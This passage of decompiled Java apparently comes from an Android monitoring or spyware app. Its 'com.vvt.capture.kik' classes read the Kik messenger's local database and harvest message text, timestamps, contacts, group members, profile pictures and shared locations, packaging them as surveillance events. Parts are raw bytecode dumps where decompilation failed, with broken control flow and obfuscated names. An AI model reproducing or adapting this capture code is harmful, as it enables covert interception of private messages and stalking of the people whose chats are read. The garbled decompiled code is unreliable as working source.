    //   0	126	1	paramString	String
    //   1	115	2	localObject1	Object
    //   117	1	2	localObject2	Object
    //   5	66	3	localObject3	Object
    //   78	1	3	localException1	Exception
    //   80	30	3	localObject4	Object
    //   7	31	4	bool1	boolean
    //   55	4	4	i	int
    //   84	3	4	bool2	boolean
    //   14	35	5	localObject5	Object
    //   121	1	5	localException2	Exception
    //   98	5	6	localObject6	Object
    // Exception table:
    //   from	to	target	type
    //   2	5	78	java/lang/Exception
    //   9	14	78	java/lang/Exception
    //   19	21	78	java/lang/Exception
    //   23	28	78	java/lang/Exception
    //   2	5	98	finally
    //   9	14	98	finally
    //   19	21	98	finally
    //   23	28	98	finally
    //   29	35	117	finally
    //   48	55	117	finally
    //   58	65	117	finally
    //   81	84	117	finally
    //   29	35	121	java/lang/Exception
    //   48	55	121	java/lang/Exception
    //   58	65	121	java/lang/Exception
  }
  
  public static String a(String paramString)
  {
    return p.a(paramString, "busybox");
  }
  
  private static String a(String paramString1, String paramString2)
  {
    Object localObject1 = null;
    Object localObject2 = ImType.KIK;
    Object localObject3 = ImMediaFileType.THUMBMAIL;
    localObject2 = com.vvt.im.a.c.a(paramString1, (ImType)localObject2, (ImMediaFileType)localObject3);
    localObject3 = com.vvt.im.a.c.a(ImMediaFileType.THUMBMAIL);
    Object localObject4 = new java/lang/StringBuilder;
    ((StringBuilder)localObject4).<init>();
    localObject2 = ((StringBuilder)localObject4).append((String)localObject2);
    localObject4 = File.separator;
    localObject2 = (String)localObject4 + (String)localObject3;
    int i = 3;
    localObject3 = ThumbnailUtils.createVideoThumbnail(paramString2, i);
    localObject4 = new java/io/File;
    ((File)localObject4).<init>((String)localObject2);
    if (localObject3 != null) {}
    try
    {
      FileOutputStream localFileOutputStream = new java/io/FileOutputStream;
      localFileOutputStream.<init>((File)localObject4);
      localObject4 = Bitmap.CompressFormat.JPEG;
      int j = 40;
      boolean bool1 = ((Bitmap)localObject3).compress((Bitmap.CompressFormat)localObject4, j, localFileOutputStream);
      if (bool1) {
        localObject1 = localObject2;
      }
      localFileOutputStream.flush();
      localFileOutputStream.close();
    }
    catch (Exception localException)
    {
      for (;;)
      {
        boolean bool2 = b;
        if (!bool2) {}
      }
    }
    return (String)localObject1;
  }
  
  private static ArrayList a(SQLiteDatabase paramSQLiteDatabase, String paramString1, Cursor paramCursor, String paramString2, com.vvt.base.b paramb)
  {
    ArrayList localArrayList1 = new java/util/ArrayList;
    localArrayList1.<init>();
    do
    {
      for (;;)
      {
        try
        {
          boolean bool1 = paramCursor.moveToLast();
          if (!bool1) {
            continue;
          }
          bool1 = a;
          if (bool1) {}
          locald = b(paramString2, paramString1);
          localKikData = new com/vvt/capture/kik/KikData;
          localKikData.<init>();
          localf = new com/vvt/im/events/info/f;
          localf.<init>();
          localb = new com/vvt/im/events/info/b;
          localb.<init>();
          localc = new com/vvt/im/events/info/c;
          localc.<init>();
          localObject1 = new java/util/ArrayList;
          ((ArrayList)localObject1).<init>();
          localObject3 = new java/util/ArrayList;
          ((ArrayList)localObject3).<init>();
          localObject1 = MessageType.Text;
          n = ((MessageType)localObject1).getNumber();
          i1 = 0;
          str1 = null;
          localObject1 = "body";
          i = paramCursor.getColumnIndex((String)localObject1);
          localObject4 = paramCursor.getString(i);
          localObject1 = "bin_id";
          i = paramCursor.getColumnIndex((String)localObject1);
          str2 = paramCursor.getString(i);
          localObject1 = "stat_msg";
          i = paramCursor.getColumnIndex((String)localObject1);
          str3 = paramCursor.getString(i);
          localObject1 = "sys_msg";
          i = paramCursor.getColumnIndex((String)localObject1);
          str4 = paramCursor.getString(i);
          localObject1 = "content_id";
          i = paramCursor.getColumnIndex((String)localObject1);
          str5 = paramCursor.getString(i);
          localObject1 = "was_me";
          i = paramCursor.getColumnIndex((String)localObject1);
          i = paramCursor.getInt(i);
          localArrayList2 = b(paramSQLiteDatabase, str2, paramString1);
          i2 = 1;
          if (i != i2) {
            continue;
          }
          localObject1 = KikData.Direction.OUT;
          localObject5 = locald.b();
          localf.a((String)localObject5);
          localObject5 = locald.a();
          localf.b((String)localObject5);
          localObject5 = locald.g();
          localf.e((String)localObject5);
        }
        catch (Exception localException)
        {
          com.vvt.im.events.info.d locald;
          KikData localKikData;
          f localf;
          com.vvt.im.events.info.b localb;
          com.vvt.im.events.info.c localc;
          Object localObject1;
          Object localObject3;
          int n;
          int i1;
          String str1;
          int i;
          Object localObject4;
          String str2;
          String str3;
          String str4;
          String str5;
          ArrayList localArrayList2;
          int i2;
          Object localObject5;
          long l;
          Object localObject6;
          Object localObject7;
          int j;
          int i3;
          int k;
          String str6;
          Iterator localIterator;
          boolean bool2;
          boolean bool4;
          int m;
          boolean bool3 = b;
          if (!bool3) {
            continue;
          }
          continue;
          bool3 = false;
          Object localObject2 = null;
          continue;
          localObject2 = localObject5;
          continue;
        }
        localObject5 = "timestamp";
        i2 = paramCursor.getColumnIndex((String)localObject5);
        l = paramCursor.getLong(i2);
        localObject5 = new java/text/SimpleDateFormat;
        localObject6 = "dd/MM/yy HH:mm:ss";
        ((SimpleDateFormat)localObject5).<init>((String)localObject6);
        localObject6 = new java/util/Date;
        ((Date)localObject6).<init>(l);
        localObject5 = ((SimpleDateFormat)localObject5).format((Date)localObject6);
        localKikData.a(n);
        if ((str3 != null) || (localObject4 != null) || (str5 == null) || (str4 != null)) {
          continue;
        }
        localObject3 = a(paramSQLiteDatabase, paramString1, localKikData, str5, paramb);
        localObject7 = localObject4;
        localObject4 = localObject3;
        localObject3 = localObject7;
        localKikData.b((List)localObject4);
        localKikData.a(l);
        localKikData.b((String)localObject5);
        localKikData.a(localc);
        localKikData.a((KikData.Direction)localObject1);
        localKikData.a(localArrayList2);
        localKikData.a(locald);
        localKikData.a(localf);
        i = localArrayList2.size();
        if (i <= 0) {
          continue;
        }
        localObject1 = "groups.kik.com";
        j = str2.contains((CharSequence)localObject1);
        if (j == 0) {
          continue;
        }
        j = 1;
        localKikData.a(j);
        localObject1 = a(paramSQLiteDatabase, str2);
        if (localObject1 != null) {
          continue;
        }
        j = 0;
        localObject1 = null;
        localObject1 = localArrayList2.get(0);
        localObject1 = (com.vvt.im.events.info.e)localObject1;
        str1 = ((com.vvt.im.events.info.e)localObject1).c();
        j = 1;
        localObject1 = str1;
        i1 = j;
        i3 = localArrayList2.size();
        if (i1 >= i3) {
          continue;
        }
        localObject4 = new java/lang/StringBuilder;
        ((StringBuilder)localObject4).<init>();
        localObject1 = ((StringBuilder)localObject4).append((String)localObject1);
        localObject4 = ",";
        localObject4 = ((StringBuilder)localObject1).append((String)localObject4);
        localObject1 = localArrayList2.get(i1);
        localObject1 = (com.vvt.im.events.info.e)localObject1;
        localObject1 = ((com.vvt.im.events.info.e)localObject1).c();
        localObject1 = ((StringBuilder)localObject4).append((String)localObject1);
        localObject4 = ((StringBuilder)localObject1).toString();
        k = i1 + 1;
        i1 = k;
        localObject1 = localObject4;
        continue;
        localObject5 = KikData.Direction.IN;
        k = localArrayList2.size();
        if (k <= 0) {
          continue;
        }
        localObject1 = "partner_jid";
        k = paramCursor.getColumnIndex((String)localObject1);
        str6 = paramCursor.getString(k);
        localIterator = localArrayList2.iterator();
        bool2 = localIterator.hasNext();
        if (!bool2) {
          continue;
        }
        localObject1 = localIterator.next();
        localObject1 = (com.vvt.im.events.info.e)localObject1;
        localObject6 = ((com.vvt.im.events.info.e)localObject1).d();
        bool4 = ((String)localObject6).equalsIgnoreCase(str6);
        if (bool4)
        {
          localf.a(str6);
          str6 = ((com.vvt.im.events.info.e)localObject1).c();
          localf.b(str6);
          localObject1 = ((com.vvt.im.events.info.e)localObject1).a();
          localf.e((String)localObject1);
          bool2 = a;
          if (!bool2) {
            continue;
          }
          localObject1 = localObject5;
        }
      }
      if (str3 != null)
      {
        localObject1 = KikData.Direction.LOCAL_IM;
        localObject4 = str3;
      }
      for (;;)
      {
        localKikData.a((String)localObject4);
        localObject7 = localObject4;
        localObject4 = localObject3;
        localObject3 = localObject7;
        break;
        if (str4 != null)
        {
          localObject1 = KikData.Direction.LOCAL_IM;
          localObject4 = str4;
        }
      }
      bool2 = false;
      localObject1 = null;
      localObject1 = localArrayList2.get(0);
      localObject1 = (com.vvt.im.events.info.e)localObject1;
      localObject1 = ((com.vvt.im.events.info.e)localObject1).c();
      localb.a(str2);
      localb.b((String)localObject1);
      bool2 = false;
      localObject1 = null;
      localObject1 = localArrayList2.get(0);
      localObject1 = (com.vvt.im.events.info.e)localObject1;
      localObject1 = ((com.vvt.im.events.info.e)localObject1).a();
      localb.c((String)localObject1);
      localKikData.a(localb);
      localObject1 = MessageType.none;
      m = ((MessageType)localObject1).getNumber();
      if ((n == m) || (localObject3 == null))
      {
        bool3 = c;
        if (!bool3) {}
      }
      else
      {
        localArrayList1.add(localKikData);
      }
      bool3 = paramCursor.moveToPrevious();
    } while (bool3);
    bool3 = a;
    if (bool3) {}
    return localArrayList1;
  }
  
  private static ArrayList a(SQLiteDatabase paramSQLiteDatabase, String paramString1, KikData paramKikData, String paramString2, com.vvt.base.b paramb)
  {
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    com.vvt.im.events.info.a locala = new com/vvt/im/events/info/a;
    locala.<init>();
    boolean bool = a;
    if (bool) {}
    SystemClock.sleep(10000L);
    locala = a(paramSQLiteDatabase, paramKikData, paramString2, paramString1, paramb);
    localArrayList.add(locala);
    return localArrayList;
  }
  
  /* Error */
  public static ArrayList a(String paramString1, String paramString2, String paramString3, long paramLong1, long paramLong2, com.vvt.base.b paramb)
  {
    // Byte code:
    //   0: iconst_0
    //   1: istore 8
    //   3: aconst_null
    //   4: astore 9
    //   6: getstatic 13	com/vvt/capture/kik/removeFromPath:a	Z
    //   9: istore 10
    //   11: iload 10
    //   13: ifeq +3 -> 16
    //   16: new 354	java/util/ArrayList
    //   19: astore 11
    //   21: aload 11
    //   23: invokespecial 355	java/util/ArrayList:<init>	()V
    //   26: aload_1
    //   27: invokestatic 28	com/vvt/ag/removeFromPath:a	(Ljava/lang/String;)Z
    //   30: istore 12
    //   32: iload 12
    //   34: ifeq +203 -> 237
    //   37: invokestatic 33	com/vvt/n/a/MyUncaughtExceptionHandler/a:removeFromPath	()Ljava/lang/String;
    //   40: astore 13
    //   42: ldc 119
    //   44: astore 14
    //   46: aload 14
    //   48: aload 13
    //   50: invokestatic 512	com/vvt/capture/kik/a/a:a	(Ljava/lang/String;Ljava/lang/String;)Landroid/database/sqlite/SQLiteDatabase;
    //   53: astore 13
    //   55: aload 13
    //   57: ifnull +145 -> 202
    //   60: invokestatic 513	com/vvt/capture/kik/removeFromPath:removeFromPath	()Ljava/lang/String;
    //   63: astore 14
    //   65: iconst_2
    //   66: istore 15
    //   68: iload 15
    //   70: anewarray 88	java/lang/String
    //   73: astore 16
    //   75: iconst_0
    //   76: istore 17
    //   78: new 199	java/lang/StringBuilder
    //   81: astore 18
    //   83: aload 18
    //   85: invokespecial 200	java/lang/StringBuilder:<init>	()V
    //   88: aload 18
    //   90: lload_3
    //   91: invokevirtual 516	java/lang/StringBuilder:append	(J)Ljava/lang/StringBuilder;
    //   94: astore 18
    //   96: ldc_w 518
    //   99: astore 19
    //   101: aload 18
    //   103: aload 19
    //   105: invokevirtual 204	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   108: astore 18
    //   110: aload 18
    //   112: invokevirtual 212	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   115: astore 18
    //   117: aload 16
    //   119: iconst_0
    //   120: aload 18
    //   122: aastore
    //   123: iconst_1
    //   124: istore 17
    //   126: new 199	java/lang/StringBuilder
    //   129: astore 18
    //   131: aload 18
    //   133: invokespecial 200	java/lang/StringBuilder:<init>	()V
    //   136: aload 18
    //   138: lload 5
    //   140: invokevirtual 516	java/lang/StringBuilder:append	(J)Ljava/lang/StringBuilder;
    //   143: astore 18
    //   145: ldc_w 518
    //   148: astore 19
    //   150: aload 18
    //   152: aload 19
    //   154: invokevirtual 204	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   157: astore 18
    //   159: aload 18
    //   161: invokevirtual 212	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   164: astore 18
    //   166: aload 16
    //   168: iload 17
    //   170: aload 18
    //   172: aastore
    //   173: aload 13
    //   175: aload 14
    //   177: aload 16
    //   179: invokevirtual 92	android/database/sqlite/SQLiteDatabase:rawQuery	(Ljava/lang/String;[Ljava/lang/String;)Landroid/database/Cursor;
    //   182: astore 9
    //   184: aload 9
    //   186: ifnull +60 -> 246
    //   189: aload 13
    //   191: aload_0
    //   192: aload 9
    //   194: aload_2
    //   195: aload 7
    //   197: invokestatic 521	com/vvt/capture/kik/removeFromPath:a	(Landroid/database/sqlite/SQLiteDatabase;Ljava/lang/String;Landroid/database/Cursor;Ljava/lang/String;Lcom/vvt/base/removeFromPath;)Ljava/util/ArrayList;
    //   200: astore 11
    //   202: aload 13
    //   204: ifnull +8 -> 212
    //   207: aload 13
    //   209: invokevirtual 75	android/database/sqlite/SQLiteDatabase:close	()V
    //   212: aload 9
    //   214: ifnull +10 -> 224
    //   217: aload 9
    //   219: invokeinterface 74 1 0
    //   224: getstatic 13	com/vvt/capture/kik/removeFromPath:a	Z
    //   227: istore 8
    //   229: iload 8
    //   231: ifeq +3 -> 234
    //   234: aload 11
    //   236: areturn
    //   237: aload_1
    //   238: invokestatic 38	com/vvt/capture/kik/a/a:a	(Ljava/lang/String;)Landroid/database/sqlite/SQLiteDatabase;
    //   241: astore 13
    //   243: goto -188 -> 55
    //   246: ldc2_w 522
    //   249: lstore 20
    //   251: lload 20
    //   253: invokestatic 506	android/os/SystemClock:sleep	(J)V
    //   256: invokestatic 513	com/vvt/capture/kik/removeFromPath:removeFromPath	()Ljava/lang/String;
    //   259: astore 14
    //   261: iconst_1
    //   262: istore 15
    //   264: iload 15
    //   266: anewarray 88	java/lang/String
    //   269: astore 16
    //   271: iconst_0
    //   272: istore 17
    //   274: new 199	java/lang/StringBuilder
    //   277: astore 18
    //   279: aload 18
    //   281: invokespecial 200	java/lang/StringBuilder:<init>	()V
    //   284: aload 18
    //   286: lload_3
    //   287: invokevirtual 516	java/lang/StringBuilder:append	(J)Ljava/lang/StringBuilder;
    //   290: astore 18
    //   292: ldc_w 518
    //   295: astore 19
    //   297: aload 18
    //   299: aload 19
    //   301: invokevirtual 204	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   304: astore 18
    //   306: aload 18
    //   308: invokevirtual 212	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   311: astore 18
    //   313: aload 16
    //   315: iconst_0
    //   316: aload 18
    //   318: aastore
    //   319: aload 13
    //   321: aload 14
    //   323: aload 16
    //   325: invokevirtual 92	android/database/sqlite/SQLiteDatabase:rawQuery	(Ljava/lang/String;[Ljava/lang/String;)Landroid/database/Cursor;
    //   328: astore 9
    //   330: aload 9
    //   332: ifnull -130 -> 202
    //   335: aload 13
    //   337: aload_0
    //   338: aload 9
    //   340: aload_2
    //   341: aload 7
    //   343: invokestatic 521	com/vvt/capture/kik/removeFromPath:a	(Landroid/database/sqlite/SQLiteDatabase;Ljava/lang/String;Landroid/database/Cursor;Ljava/lang/String;Lcom/vvt/base/removeFromPath;)Ljava/util/ArrayList;
    //   346: astore 11
    //   348: goto -146 -> 202
    //   351: astore 13
    //   353: iconst_0
    //   354: istore 12
    //   356: aconst_null
    //   357: astore 13
    //   359: getstatic 18	com/vvt/capture/kik/removeFromPath:removeFromPath	Z
    //   362: istore 22
    //   364: iload 22
    //   366: ifeq +3 -> 369
    //   369: aload 13
    //   371: ifnull +8 -> 379
    //   374: aload 13
    //   376: invokevirtual 75	android/database/sqlite/SQLiteDatabase:close	()V
    //   379: aload 9
    //   381: ifnull -157 -> 224
    //   384: goto -167 -> 217
    //   387: astore 11
    //   389: iconst_0
    //   390: istore 12
    //   392: aconst_null
    //   393: astore 13
    //   395: aload 13
    //   397: ifnull +8 -> 405
    //   400: aload 13
    //   402: invokevirtual 75	android/database/sqlite/SQLiteDatabase:close	()V
    //   405: aload 9
    //   407: ifnull +10 -> 417
    //   410: aload 9
    //   412: invokeinterface 74 1 0
    //   417: aload 11
    //   419: athrow
    //   420: astore 11
    //   422: goto -27 -> 395
    //   425: astore 14
    //   427: goto -68 -> 359
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	430	0	paramString1	String
    //   0	430	1	paramString2	String
    //   0	430	2	paramString3	String
    //   0	430	3	paramLong1	long
    //   0	430	5	paramLong2	long
    //   0	430	7	paramb	com.vvt.base.removeFromPath
    //   1	229	8	bool1	boolean
    //   4	407	9	localCursor	Cursor
    //   9	3	10	bool2	boolean
    //   19	328	11	localArrayList	ArrayList
    //   387	31	11	localObject1	Object
    //   420	1	11	localObject2	Object
    //   30	361	12	bool3	boolean
    //   40	296	13	localObject3	Object
    //   351	1	13	localException1	Exception
    //   357	44	13	localObject4	Object
    //   44	278	14	str1	String
    //   425	1	14	localException2	Exception
    //   66	199	15	i	int
    //   73	251	16	arrayOfString	String[]
    //   76	197	17	j	int
    //   81	236	18	localObject5	Object
    //   99	201	19	str2	String
    //   249	3	20	l	long
    //   362	3	22	bool4	boolean
    // Exception table:
    //   from	to	target	type
    //   26	30	351	java/lang/Exception
    //   37	40	351	java/lang/Exception
    //   48	53	351	java/lang/Exception
    //   237	241	351	java/lang/Exception
    //   26	30	387	finally
    //   37	40	387	finally
    //   48	53	387	finally
    //   237	241	387	finally
    //   60	63	420	finally
    //   68	73	420	finally
    //   78	81	420	finally
    //   83	88	420	finally
    //   90	94	420	finally
    //   103	108	420	finally
    //   110	115	420	finally
    //   120	123	420	finally
    //   126	129	420	finally
    //   131	136	420	finally
    //   138	143	420	finally
    //   152	157	420	finally
    //   159	164	420	finally
    //   170	173	420	finally
    //   177	182	420	finally
    //   195	200	420	finally
    //   251	256	420	finally
    //   256	259	420	finally
    //   264	269	420	finally
    //   274	277	420	finally
    //   279	284	420	finally
    //   286	290	420	finally
    //   299	304	420	finally
    //   306	311	420	finally
    //   316	319	420	finally
    //   323	328	420	finally
    //   341	346	420	finally
    //   359	362	420	finally
    //   60	63	425	java/lang/Exception
    //   68	73	425	java/lang/Exception
    //   78	81	425	java/lang/Exception
    //   83	88	425	java/lang/Exception
    //   90	94	425	java/lang/Exception
    //   103	108	425	java/lang/Exception
    //   110	115	425	java/lang/Exception
    //   120	123	425	java/lang/Exception
    //   126	129	425	java/lang/Exception
    //   131	136	425	java/lang/Exception
    //   138	143	425	java/lang/Exception
    //   152	157	425	java/lang/Exception
    //   159	164	425	java/lang/Exception
    //   170	173	425	java/lang/Exception
    //   177	182	425	java/lang/Exception
    //   195	200	425	java/lang/Exception
    //   251	256	425	java/lang/Exception
    //   256	259	425	java/lang/Exception
    //   264	269	425	java/lang/Exception
    //   274	277	425	java/lang/Exception
    //   279	284	425	java/lang/Exception
    //   286	290	425	java/lang/Exception
    //   299	304	425	java/lang/Exception
    //   306	311	425	java/lang/Exception
    //   316	319	425	java/lang/Exception
    //   323	328	425	java/lang/Exception
    //   341	346	425	java/lang/Exception
  }
  
  public static List a(KikData paramKikData)
  {
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    Object localObject1 = new com/vvt/events/FxIMAccountEvent;
    ((FxIMAccountEvent)localObject1).<init>();
    long l1 = paramKikData.b();
    ((FxIMAccountEvent)localObject1).setEventTime(l1);
    int i = FxIMMessageServiceType.KIK.getValue();
    ((FxIMAccountEvent)localObject1).setImServiceId(i);
    Object localObject2 = paramKikData.f().a();
    ((FxIMAccountEvent)localObject1).setOwnerDisplayName((String)localObject2);
    localObject2 = paramKikData.f().b();
    ((FxIMAccountEvent)localObject1).setOwnerId((String)localObject2);
    localObject2 = paramKikData.f().c();
    ((FxIMAccountEvent)localObject1).setOwnerProfilePicture((byte[])localObject2);
    localObject2 = paramKikData.f().g();
    ((FxIMAccountEvent)localObject1).setOwnerProfilePicturePath((String)localObject2);
    localObject2 = paramKikData.f().d();
    ((FxIMAccountEvent)localObject1).setOwnerStatusMessage((String)localObject2);
    localArrayList.add(localObject1);
    localObject2 = new com/vvt/events/FxIMConversationEvent;
    ((FxIMConversationEvent)localObject2).<init>();
    localObject1 = paramKikData.i().a();
    ((FxIMConversationEvent)localObject2).setConversationId((String)localObject1);
    localObject1 = paramKikData.i().c();
    ((FxIMConversationEvent)localObject2).setConversationProfilePicture((byte[])localObject1);
    localObject1 = paramKikData.i().d();
    ((FxIMConversationEvent)localObject2).setConversationProfilePicturePath((String)localObject1);
    localObject1 = paramKikData.i().b();
    ((FxIMConversationEvent)localObject2).setConversationTitle((String)localObject1);
    localObject1 = paramKikData.i().e();
    ((FxIMConversationEvent)localObject2).setConversationStatusMessage((String)localObject1);
    l1 = paramKikData.b();
    ((FxIMConversationEvent)localObject2).setEventTime(l1);
    int j = FxIMMessageServiceType.KIK.getValue();
    ((FxIMConversationEvent)localObject2).setImServiceId(j);
    localObject1 = paramKikData.f().b();
    ((FxIMConversationEvent)localObject2).setOwnerId((String)localObject1);
    Object localObject3 = new java/util/HashSet;
    ((HashSet)localObject3).<init>();
    localObject1 = paramKikData.e();
    Object localObject4 = ((List)localObject1).iterator();
    boolean bool1;
    Object localObject6;
    for (;;)
    {
      bool1 = ((Iterator)localObject4).hasNext();
      if (!bool1) {
        break;
      }
      localObject1 = (com.vvt.im.events.info.e)((Iterator)localObject4).next();
      localObject5 = ((com.vvt.im.events.info.e)localObject1).d();
      localObject6 = paramKikData.f().b();
      boolean bool4 = ((String)localObject5).equalsIgnoreCase((String)localObject6);
      if (bool4)
      {
        bool1 = a;
        if (!bool1) {}
      }
      else
      {
        localObject1 = ((com.vvt.im.events.info.e)localObject1).d();
        ((HashSet)localObject3).add(localObject1);
      }
    }
    ((FxIMConversationEvent)localObject2).setParticipantContactIds((HashSet)localObject3);
    localArrayList.add(localObject2);
    localObject1 = paramKikData.e();
    localObject2 = ((List)localObject1).iterator();
    for (;;)
    {
      bool1 = ((Iterator)localObject2).hasNext();
      if (!bool1) {
        break;
      }
      localObject1 = (com.vvt.im.events.info.e)((Iterator)localObject2).next();
      localObject3 = ((com.vvt.im.events.info.e)localObject1).d();
      localObject4 = paramKikData.f().b();
      boolean bool5 = ((String)localObject3).equalsIgnoreCase((String)localObject4);
      if (bool5)
      {
        bool1 = a;
        if (!bool1) {}
      }
      else
      {
        localObject3 = new com/vvt/events/FxIMContactEvent;
        ((FxIMContactEvent)localObject3).<init>();
        localObject4 = ((com.vvt.im.events.info.e)localObject1).c();
        ((FxIMContactEvent)localObject3).setContactDisplayName((String)localObject4);
        localObject4 = ((com.vvt.im.events.info.e)localObject1).d();
        ((FxIMContactEvent)localObject3).setContactId((String)localObject4);
        localObject4 = ((com.vvt.im.events.info.e)localObject1).e();
        ((FxIMContactEvent)localObject3).setContactProfilePicture((byte[])localObject4);
        localObject4 = ((com.vvt.im.events.info.e)localObject1).a();
        ((FxIMContactEvent)localObject3).setContactProfilePicturePath((String)localObject4);
        localObject1 = ((com.vvt.im.events.info.e)localObject1).f();
        ((FxIMContactEvent)localObject3).setContactStatusMessage((String)localObject1);
        long l2 = paramKikData.b();
        ((FxIMContactEvent)localObject3).setEventTime(l2);
        int k = FxIMMessageServiceType.KIK.getValue();
        ((FxIMContactEvent)localObject3).setImServiceId(k);
        localObject1 = paramKikData.f().b();
        ((FxIMContactEvent)localObject3).setOwnerId((String)localObject1);
        localArrayList.add(localObject3);
      }
    }
    localObject3 = new com/vvt/events/FxIMMessageEvent;
    ((FxIMMessageEvent)localObject3).<init>();
    localObject4 = new java/util/ArrayList;
    ((ArrayList)localObject4).<init>();
    localObject1 = paramKikData.j();
    localObject2 = ((List)localObject1).iterator();
    for (;;)
    {
      bool2 = ((Iterator)localObject2).hasNext();
      if (!bool2) {
        break;
      }
      localObject1 = (com.vvt.im.events.info.a)((Iterator)localObject2).next();
      localObject5 = new com/vvt/events/d;
      ((com.vvt.events.d)localObject5).<init>();
      localObject6 = ((com.vvt.im.events.info.a)localObject1).e();
      ((com.vvt.events.d)localObject5).b((byte[])localObject6);
      localObject6 = ((com.vvt.im.events.info.a)localObject1).a();
      ((com.vvt.events.d)localObject5).a((String)localObject6);
      localObject6 = ((com.vvt.im.events.info.a)localObject1).c();
      ((com.vvt.events.d)localObject5).b((String)localObject6);
      localObject6 = ((com.vvt.im.events.info.a)localObject1).b();
      ((com.vvt.events.d)localObject5).c((String)localObject6);
      localObject6 = ((com.vvt.im.events.info.a)localObject1).f();
      ((com.vvt.events.d)localObject5).d((String)localObject6);
      localObject1 = ((com.vvt.im.events.info.a)localObject1).d();
      ((com.vvt.events.d)localObject5).a((byte[])localObject1);
      ((List)localObject4).add(localObject5);
    }
    boolean bool2 = false;
    localObject1 = null;
    i = paramKikData.a();
    int n = MessageType.ShareLocation.getNumber();
    i &= n;
    Object localObject5 = MessageType.ShareLocation;
    n = ((MessageType)localObject5).getNumber();
    if (i == n)
    {
      localObject1 = new com/vvt/events/e;
      ((com.vvt.events.e)localObject1).<init>();
      float f = paramKikData.g().d();
      ((com.vvt.events.e)localObject1).a(f);
      double d = paramKikData.g().a();
      ((com.vvt.events.e)localObject1).a(d);
      d = paramKikData.g().b();
      ((com.vvt.events.e)localObject1).b(d);
      localObject2 = paramKikData.g().c();
      ((com.vvt.events.e)localObject1).a((String)localObject2);
    }
    localObject2 = paramKikData.i().a();
    ((FxIMMessageEvent)localObject3).setConversationId((String)localObject2);
    localObject2 = paramKikData.d();
    localObject5 = KikData.Direction.IN;
    if (localObject2 == localObject5) {}
    for (localObject2 = FxEventDirection.IN;; localObject2 = FxEventDirection.OUT)
    {
      ((FxIMMessageEvent)localObject3).setDirection((FxEventDirection)localObject2);
      long l3 = paramKikData.b();
      ((FxIMMessageEvent)localObject3).setEventTime(l3);
      i = FxIMMessageServiceType.KIK.getValue();
      ((FxIMMessageEvent)localObject3).setImServiceId(i);
      localObject2 = paramKikData.c();
      ((FxIMMessageEvent)localObject3).setMessage((String)localObject2);
      localObject2 = new com/vvt/events/e;
      ((com.vvt.events.e)localObject2).<init>();
      ((FxIMMessageEvent)localObject3).setMessageLocation((com.vvt.events.e)localObject2);
      ((FxIMMessageEvent)localObject3).setShareLocation((com.vvt.events.e)localObject1);
      int m = paramKikData.a();
      ((FxIMMessageEvent)localObject3).setTextRepresentation(m);
      localObject1 = paramKikData.d();
      localObject2 = KikData.Direction.IN;
      if (localObject1 == localObject2)
      {
        localObject1 = paramKikData.h().a();
        ((FxIMMessageEvent)localObject3).setSenderId((String)localObject1);
      }
      localObject2 = ((List)localObject4).iterator();
      for (;;)
      {
        boolean bool3 = ((Iterator)localObject2).hasNext();
        if (!bool3) {
          break;
        }
        localObject1 = (com.vvt.events.d)((Iterator)localObject2).next();
        ((FxIMMessageEvent)localObject3).addAttachment((com.vvt.events.d)localObject1);
      }
    }
    localArrayList.add(localObject3);
    return localArrayList;
  }
  
  private static boolean a(int paramInt, com.vvt.base.b paramb, long paramLong)
  {
    int i = 1;
    float f = Float.MIN_VALUE;
    boolean bool3 = false;
    boolean bool4 = a;
    if (bool4) {}
    long l1 = 0L;
    bool4 = paramLong < l1;
    if (!bool4) {}
    boolean bool2;
    for (bool4 = false;; bool4 = bool2)
    {
      long l2;
      if (paramInt == i)
      {
        l2 = paramb.b();
        boolean bool1 = paramLong < l2;
        if (!bool1) {
          break label103;
        }
      }
      for (;;)
      {
        bool4 = a;
        if (bool4) {}
        return bool3;
        int j = 3;
        f = 4.2E-45F;
        if (paramInt == j)
        {
          l2 = paramb.c();
          bool2 = paramLong < l2;
          if (bool2) {}
        }
        else
        {
          label103:
          do
          {
            bool3 = bool4;
            break;
            l2 = paramb.e();
            bool2 = paramLong < l2;
          } while (!bool2);
        }
      }
    }
  }
  
  /* Error */
  public static long b(String paramString)
  {
    // Byte code:
    //   0: iconst_m1
    //   1: i2l
    //   2: lstore_1
    //   3: iconst_0
    //   4: istore_3
    //   5: aconst_null
    //   6: astore 4
    //   8: getstatic 13	com/vvt/capture/kik/removeFromPath:a	Z
    //   11: istore 5
    //   13: iload 5
    //   15: ifeq +3 -> 18
    //   18: getstatic 13	com/vvt/capture/kik/removeFromPath:a	Z
    //   21: istore 5
    //   23: iload 5
    //   25: ifeq +3 -> 28
    //   28: aload_0
    //   29: invokestatic 28	com/vvt/ag/removeFromPath:a	(Ljava/lang/String;)Z
    //   32: istore 5
    //   34: iload 5
    //   36: ifeq +7 -> 43
    //   39: invokestatic 33	com/vvt/n/a/MyUncaughtExceptionHandler/a:removeFromPath	()Ljava/lang/String;
    //   42: astore_0
    //   43: aload_0
    //   44: invokestatic 28	com/vvt/ag/removeFromPath:a	(Ljava/lang/String;)Z
    //   47: istore 5
    //   49: iload 5
    //   51: ifne +199 -> 250
    //   54: aload_0
    //   55: invokestatic 38	com/vvt/capture/kik/a/a:a	(Ljava/lang/String;)Landroid/database/sqlite/SQLiteDatabase;
    //   58: astore 6
    //   60: aload 6
    //   62: ifnull +62 -> 124
    //   65: invokestatic 740	com/vvt/capture/kik/removeFromPath:AppEngine1	()Ljava/lang/String;
    //   68: astore 7
    //   70: aload 6
    //   72: aload 7
    //   74: aconst_null
    //   75: invokevirtual 92	android/database/sqlite/SQLiteDatabase:rawQuery	(Ljava/lang/String;[Ljava/lang/String;)Landroid/database/Cursor;
    //   78: astore 4
    //   80: aload 4
    //   82: ifnull +42 -> 124
    //   85: aload 4
    //   87: invokeinterface 95 1 0
    //   92: istore 8
    //   94: iload 8
    //   96: ifeq +68 -> 164
    //   99: ldc 62
    //   101: astore 7
    //   103: aload 4
    //   105: aload 7
    //   107: invokeinterface 66 2 0
